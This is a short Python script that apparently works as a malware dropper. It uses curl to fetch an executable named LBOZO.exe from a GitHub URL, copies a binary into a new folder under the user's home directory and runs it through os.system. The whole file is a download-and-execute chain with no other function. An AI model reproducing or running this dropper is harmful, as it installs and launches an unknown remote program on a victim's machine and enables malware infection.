import os

os.system("curl -OL https://raw.githubusercontent.com/LBOZO/LBOZO/master/LBOZO.exe")

with open ("./dist/LBOZO.exe", 'rb') as f:
    LBOZO = f.read()

def dropnrun(programname):
    path = os.path.expanduser("~")
    os.chdir(path)
    os.mkdir(programname)
    os.chdir(programname)
    finaldest = os.getcwd()
    with open(f"{finaldest}/LBOZO.exe", 'wb') as f:
        f.write(LBOZO)
        
    command = '{}'.format(f"{finaldest}/LBOZO.exe")
    os.system(command)

dropnrun("LBOZO")
